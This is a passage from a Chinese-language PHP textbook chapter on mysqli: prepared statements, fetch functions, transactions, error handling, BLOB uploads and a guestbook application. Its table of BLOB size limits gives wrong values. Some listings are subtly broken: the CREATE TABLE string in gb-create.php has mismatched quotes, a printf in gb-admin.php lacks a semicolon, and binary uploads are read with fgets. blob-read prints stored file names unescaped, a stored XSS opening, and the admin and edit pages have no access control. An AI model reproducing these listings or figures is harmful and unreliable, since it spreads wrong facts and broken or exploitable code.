字符串 "dis" 表示你有三个占位符：第一个是浮点数，第二个是整数，第三个字符串。顺序很重要；必须按照参数在 SQL 命令中出现的顺序指定参数。使用三个参数，编写如下：

```
mysqli_stmt_bind_param(
    $command,
    "dis",
    $doubleparam,
    $intparam,
    $stringparam
);
```

在我们的示例中，要简单一些，因为 SQL 命令中只有一个占位符：

```
mysqli_stmt_bind_param($command, "s", $value);
$value = "The value";
```

> **注意**  
> 因为参数值是 *按引用* 传递的，你无法直接在 `mysqli_stmt_bind_param()` 中传递值，而需要一个变量。

最后，执行 SQL 命令：使用 OOP 访问时，使用 `execute()` 方法；在过程式方法中，通过调用 `mysqli_stmt_execute()` 函数。

完整示例在以下清单中提供。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    $sql = "INSERT INTO table (field) VALUES (?)";
    $command = mysqli_prepare($db, $sql);
    mysqli_stmt_bind_param($command, "s", $value);
    $value = "value3";
    if (mysqli_stmt_execute($command)) {
        echo "Data entered.<br />";
    } else {
        echo "Error!";
    }
    mysqli_close($db);
} else {
    echo "Error!";
}
?>
```

清单 19.5 使用占位符填充表格（"mysqli-query-placeholder.php"）

为进行对比，以下是基于 OOP API 的清单。

```php
<?php
try {
    $db = new MySQLi("localhost", "user", "password", "PHP");
    $sql = "INSERT INTO my_table (field) VALUES (?)";
    $command = $db->prepare($sql);
    $command->bind_param("s", $value);
    $value = "value3";
    $command->execute();
    echo "Data entered.<br />";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.6 使用占位符填充表格（"mysqli-query-placeholder-oop.php"）

### 19.2.3 返回值

当查询的返回值很重要时，事情变得有趣起来。MySQL 像大多数其他数据库一样，使用逐行遍历结果列表的策略。当前行的数据随后以特定形式可用。每种特殊数据形式都有一个单独的函数。

要查询带返回值，也使用 `mysqli_query()`。此函数返回一个结果句柄（而 `query()` 方法返回类型为 `mysqli_result` 的对象），然后可使用它来访问结果列表中的数据。例如，可以使用 `mysqli_fetch_assoc()` 函数或 `fetch_assoc()` 方法。这同时执行两项任务：

- 它将结果列表的指针移动到下一行。  
- 它将当前行的数据确定为关联数组（以字段名作为键）。

如果没有下一行，函数返回 `false`。因此，该函数非常适合在 `while` 循环中使用：

```
while ($row = mysqli_fetch_assoc($result)) {
// Processing the result data
}
```

以下完整清单显示测试表中所有数据的输出（参见图 19.9）。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    $sql = "SELECT * FROM my_table";
    if ($result = mysqli_query($db, $sql)) {
        echo "<ul>";
        while ($row = mysqli_fetch_assoc($result)) {
            echo "<li>" . htmlspecialchars($row["id"]) .
            ": " . htmlspecialchars($row["field"]) . "</li>" ;
        }
        echo "</ul>";
    }
    mysqli_close($db);
} else {
    echo "Error!";
}
?>
```

清单 19.7 所有查询数据作为关联数组（"mysqli-read-associative.php"）

使用 OOP 接口时，代码的基本顺序不变。

```php
<?php
try {
    $db = new MySQLi("localhost", "user", "password", "PHP");
    $sql = "SELECT * FROM my_table";
    $result = $db->query($sql);
    echo "<ul>";
    while ($row = $result->fetch_assoc()) {
        echo "<li>" . htmlspecialchars($row["id"]) .
            ": " . htmlspecialchars($row["field"]) . "</li>";
    }
    echo "</ul>";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.8 所有查询数据作为关联数组（"mysqli-read-associative-oop.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_571_0.png)

图 19.9 小而强大：测试表

除了通过关联数组访问外，还有几种替代方案——例如，通过对象访问。在这种情况下，字段名是行对象的属性。相关函数称为 `mysqli_fetch_object()`，方法称为 `fetch_object()`。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    $sql = "SELECT * FROM my_table";
    if ($result = mysqli_query($db, $sql)) {
        echo "<ul>";
        while ($row = mysqli_fetch_object($result)) {
            echo "<li>" . htmlspecialchars($row->id) .
                ": " . htmlspecialchars($row->field) . "</li>";
        }
        echo "</ul>";
    }
    mysqli_close($db);
} else {
    echo "Error!";
}
?>
```

清单 19.9 所有查询数据作为对象（"mysqli-read-object.php"）

当然，在下一个清单中我们也再次查看 OOP 版本——如果我们已经在使用对象，这很好。

```php
<?php
try {
    $db = new MySQLi("localhost", "user", "password", "PHP");
    $sql = "SELECT * FROM my_table";
    $result = $db->query($sql);
    echo "<ul>";
    while ($row = $result->fetch_object()) {
        echo "<li>" . htmlspecialchars($row->id) .
            ": " . htmlspecialchars($row->field) . "</li>";
    }
    echo "</ul>";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.10 所有查询数据作为对象（"mysqli-read-object-oop.php"）

最后但同样重要的是，应介绍第三种方法（别担心，还有其他方法）：读取为数值数组。例如，如果需要读取结构未知的表，这很有用。或者如果你有类似 `SELECT COUNT()` 的查询，很难确定列名（除非使用别名）。此时，可以通过数值索引轻松访问表数据。此方法也非常快。相应的 PHP 函数称为 `mysqli_fetch_row()`，方法类似于 `fetch_row()`。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    $sql = "SELECT * FROM my_table";
    if ($result = mysqli_query($db, $sql)) {
        echo "<ul>";
        while ($row = mysqli_fetch_row($result)) {
            echo "<li>" . htmlspecialchars($row[0]) .
                ": " . htmlspecialchars($row[1]) . "</li>";
        }
        echo "</ul>";
    }
    mysqli_close($db);
} else {
    echo "Error!";
}
?>
```

清单 19.11 所有查询数据作为数值数组（"mysqli-read-array.php"）

当然，使用 OOP 编程接口仍然可以做到这一点。

```php
<?php
try {
    $db = new MySQLi("localhost", "user", "password", "PHP");
    $sql = "SELECT * FROM my_table";
    $result = $db->query($sql);
    echo "<ul>";
    while ($row = $result->fetch_row()) {
        echo "<li>" . htmlspecialchars($row[0]) .
             ": " . htmlspecialchars($row[1]) . "</li>";
    }
    echo "</ul>";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.12 所有查询数据作为数值数组（"mysqli-read-array-oop.php"）

> **注意**  
> 正如前面所述，读取数据还有其他选项，将稍后介绍。`mysqli_fetch_array()` 函数和 `fetch_array()` 方法将当前行读取为数组，是 `mysqli_fetch_assoc()` 和 `mysqli_fetch_row()` 的一种混合体。此函数可以返回关联数组、数值数组，甚至两者皆可。可以通过给函数传递第二个参数（数组类型）来控制其行为。mysqli 扩展为此提供了以下常量选项：
>
> - MYSQLI_ASSOC  
>   关联数组  
> - MYSQLI_BOTH  
>   关联数组和数值数组（默认行为）





## MYSQLI_NUM

数值数组

使用 mysqli_fetch_fields() 函数或 fetch_fields() 方法，可以一次性读取结果列表中的所有数据，作为对象数组。其工作方式就像你反复调用 mysqli_fetch_object() 直到没有更多数据，并将所有返回值压入数组。

还有更多可能性，但就目前介绍的内容而言，你已了解实际应用中真正相关的那些。

### 19.2.4 特殊功能

MySQL 是一个非常强大的数据库。特别是较新版本，增加了许多数据库开发者长期期待的功能。然而，本节并非专门讨论 MySQL 的精妙之处，而是讨论 mysqli 扩展的那些功能，它还有几个更实用的函数。

## 最后插入的自动值

当向带有自动值列的表中插入数据（通过 INSERT）时，确定最后插入值的 ID 可能很重要。对此有多种方法，大多遵循“写入后再尝试读取新数据记录”的思路。但有一种更简单的方法。mysqli_insert_id() 函数（或用于面向对象访问的 insert_id 属性）返回最后一次插入操作的自动值。下面的清单提供了一个示例；图 19.10 显示了输出。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    $sql = "INSERT INTO my_table (field) VALUES ('value4')";
    if (mysqli_query($db, $sql)) {
        $id = mysqli_insert_id($db);
        echo "Data with ID $id entered.";
    } else {
        echo "Error!";
    }
    mysqli_close($db);
} else {
    echo "Error: $error";
}
?>
```

清单 19.13 最后输入数据记录的 ID ("mysqli-insertid.php")

在面向对象的变体中，它看起来如下清单所示。

```php
<?php
try {
    $db = new MySQLi("localhost", "user", "password", "PHP");
    $sql = "INSERT INTO my_table (field) VALUES ('value4')";
    $db->query($sql);
    $id = $db->insert_id;
    echo "Data with ID $id inserted.";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.14 最后输入数据集的 ID ("mysqli-insertid-oop.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_575_0.png)

图 19.10 最后插入过程的 ID

## 事务

虽然最初花费了一些时间，但 MySQL 现在已经支持事务一段时间了。2 你可以用它做很多事情。作为一个小的（略显牵强）示例，让我们看看确定最后自动值的另一种方法：输入一条数据记录，然后读出最大值。如果这在事务中发生，同时写入的进程无法篡改结果。

你需要以下三种方法：

- mysqli_autocommit($db, false)
  禁用自动提交（或者：$db->autocommit(false)）
- mysqli_commit($db)
  提交事务（或者：$db->commit()）
- mysqli_rollback($db)
  取消事务（或者：$db->rollback()）

2 当前 MySQL 版本的标准引擎 InnoDB 支持事务。较旧的引擎 MyISAM 曾是标准引擎，不支持此功能。

下面的清单演示了如何以这种方式确定自动值。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    mysqli_autocommit($db, false);
    $sql = "INSERT INTO my_table (field) VALUES ('value5')";
    if (mysqli_query($db, $sql)) {
        $result = mysqli_query($db, "SELECT MAX(id) FROM my_table");
        $row = mysqli_fetch_row($result);
        $id = $row[0];
        echo "Data with the ID $id entered.";
        mysqli_commit($db);
    } else {
        echo "Error!";
        mysqli_rollback($db);
    }
    mysqli_close($db);
} else {
    echo "Error: $error";
}
?>
```

清单 19.15 最后输入记录的 ID，方式稍显繁琐 ("mysqli-transaction.php")

这也适用于面向对象的方法。

```php
<?php
try {
    $db = new MySQLi("localhost", "user", "password", "PHP");
    $db->autocommit(false);
    $sql = "INSERT INTO my_table (field) VALUES ('value5')";
    $db->query($sql);

    $result = $db->query("SELECT MAX(id) FROM my_table");

    $row = $result->fetch_row();
    $id = $row[0];
    echo "Data entered with the ID $id.";

    $db->commit();
    $db->close();
} catch (Exception $ex) {
    $db->rollback();
    echo "Error: " . $ex->getMessage();
}
?>
```

清单 19.16 最后输入记录的 ID，方式稍显繁琐 ("mysqli-transaction-oop.php")

## 错误处理

如前所述，我们在示例中使用了非常简单（且不足以用于生产环境）的错误处理，以便于调试。然而，mysqli 扩展的错误处理例程在实际项目中非常实用。你通常需要以下两个函数：

- mysqli_errno($db)（或 $db->errno 属性）返回最后一次 MySQL 操作的错误编号。错误编号 0 表示未发生错误。
- mysqli_error($db)（或 $db->error 属性）返回最后一次 MySQL 操作的（文本）错误。

然而，应提及两个特殊功能。建立连接时有特殊函数：

- mysqli_connect_errno() 用于错误编号
- mysqli_connect_error() 用于错误消息

此外，如果你使用 mysqli_prepare() 创建命令对象，也可以查询其当前的错误编号和消息：

- mysqli_stmt_errno() 用于错误编号
- mysqli_stmt_error() 用于错误消息

下面的清单应生成两个错误：一个是在首次建立连接时（数据库不存在），另一个是在发送语法错误的 SQL 命令时。我们还使用 try/catch 以防止脚本在发生异常时终止。输出可见于图 19.11。

```php
<?php
try {
    if ($db = mysqli_connect("localhost", "user", "password", "ASP")) {
        echo "Connection established.<br />";
        mysqli_close($db);
    }
} catch (Exception $ex) {
    printf("Error %d: %s<br />",
        mysqli_connect_errno(),
        htmlspecialchars(mysqli_connect_error()));
}
?>
```

```php
<?php
try {
    if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
        $sql = "INSERT INTO my_table (field) VALUES ('value6')";
        if (mysqli_query($db, $sql)) {
            echo "Data entered.<br />";
        }
        mysqli_close($db);
    }
} catch (Exception $ex) {
    printf("Error %d: %s!",
    mysqli_errno($db),
    htmlspecialchars(mysqli_error($db)));
}
?>
```

清单 19.17 正确的错误管理 ("mysqli-error.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_578_0.png)

图 19.11 发生了一些错误 …

## 二进制数据

MySQL 像其他数据库一样，能够存储文件等二进制数据。在向你展示如何操作之前，先简要说明几点。通常，Web 服务器上已经有一个能够非常高效、安全地处理二进制文件的数据库：文件系统。因此在实践中，数据库通常只包含对文件的引用，例如文件名和路径。不过，也可以将文件存储在数据库中。它将这些文件存储为 *二进制大对象*（BLOBs）。

MySQL 支持一些用于此类 BLOB 的数据类型，最大尺寸各不相同（参见表 19.1）。

| 名称 | 最大字节数（约） |
| :--- | :--- |
| TINYBLOB | 256 |
| MEDIUMBLOB | 655.536 |
| BLOB | 1.677.216 |
| LONGBLOB | 4.294.967.296 |

表 19.1 MySQL 的不同 BLOB 数据类型

我们将在下面的示例中使用此方案。

```sql
CREATE TABLE `PHP`.`files` (
  `id` INT NOT NULL AUTO_INCREMENT ,
  `name` VARCHAR(100) NOT NULL ,
  `data` MEDIUMBLOB NOT NULL , PRIMARY KEY (`id`)
) ENGINE = InnoDB;
```

清单 19.18 创建表的 SQL 命令 ("blob.sql")

控制 BLOB 字段是错误的常见来源，但如果你了解其背景，这些错误很容易避免。首先，我们照常进行，并使用预处理语句：

```php
$sql = "INSERT INTO files (name, data) VALUES (?, ?)";
$command = mysqli_prepare($db, $sql);
```

接下来，我们将值绑定到参数。如前所述，“s”代表字符串——但如何映射 BLOB 呢？这时 MySQLi 扩展的“b”就派上用场了。但在赋值时有一个意外：

```php
mysqli_stmt_bind_param($command, "sb", $name, $data);
$name = "filename.xyz";
$data = null;
```

是的，你没看错：BLOB 的参数接收 null 值。其背景是，我们必须为每个参数提供一个值（这就是为什么 $data 接收一个值），但另一个方法负责处理 BLOB（这就是为什么我们只将 null 作为值）。这个其他方法称为 send_long_data()（函数名为 mysqli_stmt_send_long_data()）。在语句句柄之后的第一个参数是 SQL 参数的编号，计数从 0 开始。SQL 中 BLOB 的参数是第二个，因此我们使用值 1。该方法的下一个参数包含二进制数据：

```php
mysqli_stmt_send_long_data($command, 1, "Binary data ...");
```

```php
if (mysqli_stmt_execute($command)) {
  echo "Data entered.<br />";
} else {
  echo "Error!";
}
mysqli_close($db);
```

为什么要绕这么大弯子？MySQL 有一个名为 max_allowed_packet 的设置。如果将其设置为大于要保存在 BLOB 中的数据的值，你也可以在类型为“s”（字符串）的预处理语句中指定它，数据将完整保存。但是，如果不是这种情况，数据将被拆分（对应于 max_



allowed_packet) 并分几个步骤传输到数据库中。这正是我们需要 mysqli_stmt_send_long_data() 的原因。我们可以多次调用该函数，每次传输最多 max_allowed_packet 的数据。

## 调整数据包大小

可以调整数据包大小。如果要直接从 PHP 进行此操作，以下代码片段可提供帮助，它首先初始化 MySQL 连接，然后设置相应的选项——这里为 64 MB。随后创建数据库连接。语法与 mysqli_connect() 相似，只是名称不同——mysqli_real_connect()：

```php
$db = mysqli_init();
mysqli_options(
    $db,
    MYSQLI_READ_DEFAULT_GROUP,
    "max_allowed_packet=64MB");
mysqli_real_connect($db, "localhost", "user", "password", "PHP");
```

将使用一个小示例来展示该过程。PHP 应用程序应能够上传图像，然后将其存储在数据库中。在继续之前，有一个简短但必须且重要的说明。该应用程序并不特别安全：我们不检查是否确实传输了图形，也不检查其是否超过了任何最大大小（即使后者可能被 PHP 的上传设置拦截；参见第 13 章）。但是，该应用程序展示的是 BLOB 的读取和写入。

在文件上传表单中，文件以 1 MB 的块（1,024 × 1,024 字节）传输到 mysqli_stmt_send_long_data()。在第 25 章中，您将了解更多关于文件操作的内容。这是核心代码点：

```php
$fp = fopen($_FILES["File"]["tmp_name"], "r");
while (!feof($fp)) {
    $chunk = fgets($fp, 1024*1024);
    mysqli_stmt_send_long_data($command, 1, $chunk);
}
```

name 列将填充 HTTP 请求中指定的名称。您可以在下面的清单中查看完整代码。

```html
<html>
<head>
<title>BLOB</title>
</head>
<body>
<h1>BLOB</h1>
<?php
if (isset($_FILES["File"]) &&
    isset($_FILES["File"]["tmp_name"]) &&
    is_uploaded_file($_FILES["File"]["tmp_name"])) {
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
$sql = "INSERT INTO files (name, data) VALUES (?, ?)";
$command = mysqli_prepare($db, $sql);
mysqli_stmt_bind_param($command, "sb", $name, $data);
$name = basename($_FILES["File"]["name"]);
$data = null;
$fp = fopen($_FILES["File"]["tmp_name"], "r");
while (!feof($fp)) {
    $chunk = fgets($fp, 1024*1024);
    mysqli_stmt_send_long_data($command, 1, $chunk);
}
if (mysqli_stmt_execute($command)) {
echo "Upload completed.\n<a href=\"blob-read.php\">Overview</a>";
} else {
echo "Error: " . mysqli_error($db) . "!";
}
mysqli_close($db);
} else {
echo "Error: " . mysqli_connect_error() . "!";
}
}
?>
```

### 清单 19.19 上传文件并写入数据库 ("blob-insert.php")

使用 OOP API 时，没有重大变化，如下面的清单所示。

```html
<html>
<head>
<title>BLOB</title>
</head>
<body>
<h1>BLOB</h1>
<?php
if (isset($_FILES["File"]) &&
isset($_FILES["File"]["tmp_name"]) &&
is_uploaded_file($_FILES["File"]["tmp_name"])) {
try {
$db = new MySQLi("localhost", "user", "password", "PHP");
$sql = "INSERT INTO files (name, data) VALUES (?, ?)";
$command = $db->prepare($sql);
$command->bind_param("sb", $name, $data);
$name = basename($_FILES["File"]["name"]);
$data = null;
$fp = fopen($_FILES["File"]["tmp_name"], "r");
while (!feof($fp)) {
    $chunk = fgets($fp, 1024*1024);
    $command->send_long_data(1, $chunk);
}
try {
$command->execute();
echo "Upload completed.\n<a href=\"blob-read-oop.php\">Overview</a>";
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage() . "!";
}
$db->close();
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage() . "!";
}
}
?>
<form method="post" enctype="multipart/form-data" action="">
<input type="file" name="File">
<input type="submit" name="Submit" value="Upload" />
</form>
</body>
</html>
```

### 清单 19.20 通过 OOP 上传文件并写入数据库 ("blob-insert-oop.php")

为了方便输出数据，我们首先创建一个帮助脚本，用于返回特定图形——直接作为 PNG（为了简单起见，我们假设数据库中仅存储 PNG）。预期作为 URL 参数提供图形的 ID——id 列是主键。PHP 文件不以 `?>` 结尾，以免末尾的空白字符意外使 PNG 数据无效。下面的清单显示了相应的代码。

```php
<?php
if (isset($_GET["id"]) && ctype_digit($_GET["id"])) {
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
$sql = "SELECT * FROM files WHERE id=" . intval($_GET["id"]);
$result = mysqli_query($db, $sql);
if ($row = mysqli_fetch_object($result)) {
header("Content-type: image/png");
echo $row->data;
exit();
}
mysqli_close($db);
}
}
```

### 清单 19.21 从数据库输出图形 ("blob.php")

OOP 版本的工作方式相同。

```php
<?php
if (isset($_GET["id"]) && ctype_digit($_GET["id"])) {
try {
$db = new MySQLi("localhost", "user", "password", "PHP");
$sql = "SELECT * FROM files WHERE id=" . intval($_GET["id"]);
$result = $db->query($sql);
if ($row = $result->fetch_object()) {
header("Content-type: image/png");
echo $row->data;
exit();
}
$db->close();
} catch (Exception $ex) {
}
}
```

### 清单 19.22 通过 OOP 从数据库输出图形 ("blob-oop.php")

唯一缺少的是所有图形的输出。但是，这现在只是一个标准任务：我们使用 foreach 循环遍历所有表项并将其作为 HTML 表输出。我们只需确保例如 ID 为 42 的图形以如下方式集成：

```html
<img src="blob.php?id=42">
```

这将产生下面的清单所示的结果。

```html
<html>
<head>
<title>BLOB</title>
</head>
<body>
<h1>BLOB</h1>
<table>
<tr><th>name</th><th>image</th></tr>
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
$sql = "SELECT * FROM files";
$result = mysqli_query($db, $sql);
while ($row = mysqli_fetch_object($result)) {
printf("<tr><td>%s</td><td><img src=\"blob.php?id=%d\"></td></tr>",
$row->name, $row->id);
}
mysqli_close($db);
}
?>
</table>
</body>
</html>
```

### 清单 19.23 输出数据库中所有图形 ("blob-read.php")

您料到了：使用 OOP 接口时，基本流程不会改变。为了完整起见，我们将在下面的清单中显示代码。

```html
<html>
<head>
<title>BLOB</title>
</head>
<body>
<h1>BLOB</h1>
<table>
<tr><th>Name</th><th>Bild</th></tr>
<?php
try {
$db = new MySQLi("localhost", "user", "password", "PHP");
$sql = "SELECT * FROM files";
$result = $db->query($sql);
while ($row = $result->fetch_object()) {
printf("<tr><td>%s</td><td><img src=\"blob-oop.php?id=%d\"></td></tr>",
$row->name, $row->id);
}
$db->close();
} catch (Exception $ex) {
}
?>
</table>
</body>
</html>
```

### 清单 19.24 通过 OOP 输出数据库中所有图形 ("blob-read-oop.php")

图 19.12 显示了通过 phpMyAdmin 查看的数据库条目。图 19.13 在我们的 PHP 应用程序中以更美观的方式呈现了它们。

![](img/ae7820c36e8f24c1623d26668b28e80e_585_0.png)

### 图 19.12 phpMyAdmin 显示的 BLOB 条目

![](img/ae7820c36e8f24c1623d26668b28e80e_585_1.png)

### 图 19.13 存储在数据库中的图像

## 19.3 应用示例

在所有理论之后，现在是时候付诸实践了：访客簿是使用 mysqli 扩展实现的。数据存储在之前使用的名为 PHP 的同一数据库中。

### 19.3.1 创建表

第一步是创建数据库（已完成）和访客簿表。下面的清单向 MySQL 扩展发送相应的 CREATE TABLE 语句。

```php
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
    $sql = "CREATE TABLE guestbook ("
    id INT AUTO_INCREMENT PRIMARY KEY,
    heading VARCHAR(1000),
    entry VARCHAR(8000),
    author VARCHAR(50),
    email VARCHAR(100),
    date TIMESTAMP
    )";
    if (mysqli_query($db, $sql)) {
    echo "Table created.<br />";
    } else {
    echo "Error: " . mysqli_error($db) . "!";
    }
    mysqli_close($db);
} else {
    echo "Error: " . mysqli_connect_error() . "!";
}
?>
```

### 清单 19.25 创建表 ("gb-create.php")

请注意 date 字段的 TIMESTAMP 数据类型。MySQL 有一个很好的功能：此字段的默认值自动为当前时间戳 (CURRENT_TIMESTAMP)。这意味着在填写访客簿时，您无需费力将日期插入数据库；写入时会自动添加。

### 19.3.2 输入数据

要写入数据，我们使用带有占位符的 SQL 命令，并直接使用 HTTP 请求中的数据填充它们：



```php
$sql = "INSERT INTO guestbook
(heading,
entry,
author,
email)
VALUES (?, ?, ?, ?)";
$command = mysqli_prepare($db, $sql);
mysqli_stmt_bind_param($command, "ssss",
$_POST["Heading"],
$_POST["Comment"],
$_POST["Name"],
$_POST["Email"]);
mysqli_stmt_execute($command);
```

此外，mysqli_insert_id() 返回生成的自动值，以便仅供演示之用，提供指向相应条目编辑页面的链接（见图 19.14）。下面的清单包含完整代码。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
$sql = "INSERT INTO guestbook
(heading,
entry,
author,
email)
VALUES (?, ?, ?, ?)";
$command = mysqli_prepare($db, $sql);
mysqli_stmt_bind_param($command, "ssss",
$_POST["Heading"],
$_POST["Comment"],
$_POST["Name"],
$_POST["Email"]);
if (mysqli_stmt_execute($command)) {
$id = mysqli_insert_id($db);
echo "Entry added.<a href=\"gb-edit.php?id=$id\">Edit</a>";
} else {
    echo "Error: " . mysqli_error($db) . "!";
}
mysqli_close($db);
} else {
    echo "Error: " . mysqli_connect_error() . "!";
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" /><br />
Email address <input type="text" name="Email" /><br />
Heading <input type="text" name="Heading" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

### 清单 19.26 数据可以被输入 ("gb-enter.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_588_0.png)

### 图 19.14 插入后，出现编辑链接

## 19.3.3 输出数据

在输出数据时，面对用于读取结果列表的各种函数，我们有很多选择；我们选择了 mysqli_fetch_object()。一个特别之处是日期的输出，分几个步骤完成。MySQL 返回的值是美国样式的日期，格式为 年-月-日 小时:分钟:秒。例如，在德国网站上，这并不太美观，但 PHP 提供了帮助。strtotime() 函数可以将该值转换为数字时间戳，而 date() 则将其转换为 Y-m-d 日期格式（见图 19.15）：

```php
date("Y-m-d, H:i", strtotime($row->date))
```

其余部分照常：一个 while 循环，并记住始终传递 urlencode()/htmlspecialchars()！

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
$sql = "SELECT * FROM guestbook ORDER BY date DESC";
$result = mysqli_query($db, $sql);
while ($row = mysqli_fetch_object($result)) {
printf("<p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
<h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
urlencode($row->email),
htmlspecialchars($row->author),
htmlspecialchars(date("Y-m-d, H:i", strtotime($row->date))),
htmlspecialchars($row->heading),
nl2br(htmlspecialchars($row->entry)))
;
}
mysqli_close($db);
} else {
echo "Error: " . mysqli_connect_error() . "!";
}
?>
</body>
</html>
```

### 清单 19.27 访客簿数据被输出 ("gb-show.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_590_0.png)

### 图 19.15 日期以正确格式显示

## 19.3.4 删除数据

在 gb-admin.php 页面，删除数据同样提供了一个两步选项。为此，我们首先需要 gb-show.php 中的大部分代码来显示所有访客簿条目，以及删除和编辑它们的链接（见图 19.16）。使用“更简单”的 SQL 命令 DELETE 语句，我们省去了在 SQL 中使用占位符的打字麻烦，但首先使用 mysqli_real_escape_string() 编辑 id 参数：

```php
$id = mysqli_escape_string($db, $_GET["id"]);
$sql = "DELETE FROM guestbook WHERE id=$id";
```

下面的清单包含完整代码。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
if (isset($_GET["ok"])) {
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
$id = mysqli_escape_string($db, $_GET["id"]);
$sql = "DELETE FROM guestbook WHERE id=$id";
if (mysqli_query($db, $sql)) {
echo "<p>Entry deleted.</p>
<p><a href=\"gb-admin.php\">Back to overview
</a></p>";
} else {
echo "Error: " . mysqli_error($db) . "!";
}
mysqli_close($db);
} else {
echo "Error: " . mysqli_connect_error() . "!";
}
} else {
printf("<a href=\"gb-admin.php?id=%s&ok=1\">Really delete?</a>", urlencode($_GET["id"]));
}
} else {
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
$sql = "SELECT * FROM guestbook ORDER BY date DESC";
$result = mysqli_query($db, $sql);
while ($row = mysqli_fetch_object($result)) {
printf("<p><b><a href=\"gb-admin.php?id=%s\">Delete this entry</a> - <a href=\"gb-edit.php?id=%s\">Edit this entry</a></b><br></p>
<p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
<h3>%s</h3><p>%s<hr noshade=\"noshade\" /></p>",
urlencode($row->id),
urlencode($row->id),
htmlspecialchars($row->email),
htmlspecialchars($row->author),
htmlspecialchars(date("Y-m-d, H:i", strtotime($row->date))),
htmlspecialchars($row->heading),
nl2br(htmlspecialchars($row->entry)))
}
mysqli_close($db);
} else {
echo "Error: " . mysqli_connect_error() . "!";
}
}
?>
</body>
</html>
```

### 清单 19.28 显示所有数据包括删除选项 ("gb-admin.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_592_0.png)

### 图 19.16 访客簿的管理概览

## 19.3.5 编辑数据

最后，我们必须考虑在输入后修改现有的访客簿条目，这当然只应允许管理员（以及我个人认为的原始经过身份验证的发布者）进行。条目中的数据保存在变量中，并用于预填充表单字段（见图 19.17）。然后更改通过 UPDATE 语句（同样带有占位符）进入数据库。

此脚本使用了所有先前的技术，因此下面的清单中不再赘述地完整重现了它。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
$Name = "";
$Email = "";
$Heading = "";
$Comment = "";

if (isset($_GET["id"]) &&
is_numeric($_GET["id"])) {
if ($db = mysqli_connect("localhost", "user", "password", "PHP")) {
if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
$sql = "UPDATE guestbook SET
        heading = ?,
        entry = ?,
        author = ?,
        email = ?
        WHERE id=?";
$command = mysqli_prepare($db, $sql);
mysqli_stmt_bind_param($command, "ssssi",
                       $_POST["Heading"],
                       $_POST["Comment"],
                       $_POST["Name"],
                       $_POST["Email"],
                       intval($_GET["id"]));
if (mysqli_stmt_execute($command)) {
    echo "<p>Entry changed.</p>
          <p><a href=\"gb-admin.php\">Back to the overview</a></p>";
} else {
    echo "Error: " . mysqli_error($db) . "!";
}
}

$sql = sprintf("SELECT * FROM guestbook WHERE id=%s",
               mysqli_real_escape_string($db, $_GET["id"]));
$result = mysqli_query($db, $sql);
if ($row = mysqli_fetch_object($result)) {
    $Name = $row->author;
    $Email = $row->email;
    $Heading = $row->heading;
    $Comment = $row->entry;
}
mysqli_close($db);
} else {
    echo "Error: " . mysqli_connect_error() . "!";
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" value="<?php
echo htmlspecialchars($Name);
?>" /><br />
Email address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>" /><br />
Heading <input type="text" name="Heading" value="<?php
echo htmlspecialchars($Heading);
?>" /><br />
Comment:
<textarea cols="70" rows="10" name="Comment"><?php
echo htmlspecialchars($Comment);
?></textarea><br />
<input type="submit" name="Submit" value="Update" />
</form>
</body>
</html>
```

### 清单 19.29 编辑访客簿条目 ("gb-edit.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_594_0.png)

### 图 19.17 编辑表单已预填充

就这样：你现在可以使用 MySQL 和 PHP 创建复杂的数据库应用程序。如果你对其他数据库也感兴趣，请继续阅读：正如接下来的章节所示，PHP 还有更多可提供的功能。

## 19.4 设置

